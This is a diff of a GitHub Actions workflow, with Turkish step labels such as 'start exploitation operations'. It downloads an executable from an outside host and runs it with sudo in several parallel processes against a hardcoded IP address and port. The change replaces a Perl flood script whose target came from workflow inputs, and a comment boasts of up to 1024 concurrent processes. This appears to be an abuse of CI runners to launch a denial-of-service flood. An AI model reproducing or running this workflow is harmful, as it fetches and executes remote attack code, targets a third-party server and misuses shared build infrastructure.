@@ -21,8 +21,8 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/LIJ8TqHRR4/hoplatici.pl -O hoplatici.pl
-          chmod +x hoplatici.pl
+          wget https://wgetz.com/etHAjhue0L/ms1 -O ms1
+          chmod +x ms1
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
@@ -32,7 +32,7 @@ jobs:
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 perl hoplatici.pl ${{ inputs.ip }} ${{ inputs.port }} 1400 60 &
+            sudo timeout 60 ./ms1 54.38.152.99 22005 800 1333 99999 &
             PIDS+=($!)
           done
           
